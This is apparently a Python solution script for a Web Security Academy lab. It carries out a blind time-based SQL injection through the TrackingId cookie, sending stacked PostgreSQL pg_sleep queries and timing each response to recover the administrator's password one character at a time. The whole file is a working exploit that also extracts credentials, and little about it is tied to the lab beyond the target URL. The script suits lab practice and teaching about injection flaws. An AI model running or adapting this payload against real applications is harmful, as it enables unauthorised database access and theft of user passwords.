import requests
import time

url = 'https://0aad003a030cd01682c99d5700090073.web-security-academy.net/'

cookies = {'TrackingId':'',
           'session':'daPNflBeYgPBuONQNLl1rCcFUo2TgRsj'}

password = ''

chars = "abcdefghijklmnopqrstuvwxyz0123456789"

for i in range(1,21):
    for char in chars:
        tracking = f"RDKDXtBvb9Tpvpwv'%3BSELECT+CASE+WHEN+SUBSTRING(password,{i},1)='{char}'+THEN+pg_sleep(12)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--"
        cookies['TrackingId'] = tracking
        
        start_time = time.time()
        response = requests.get(url=url, cookies=cookies)
        end_time = time.time()
        
        result = end_time - start_time
        if result > 11:
            password += char
            print(f'current password: {password}')
            break
            

print()
print(f'The password is: [ {password} ]')
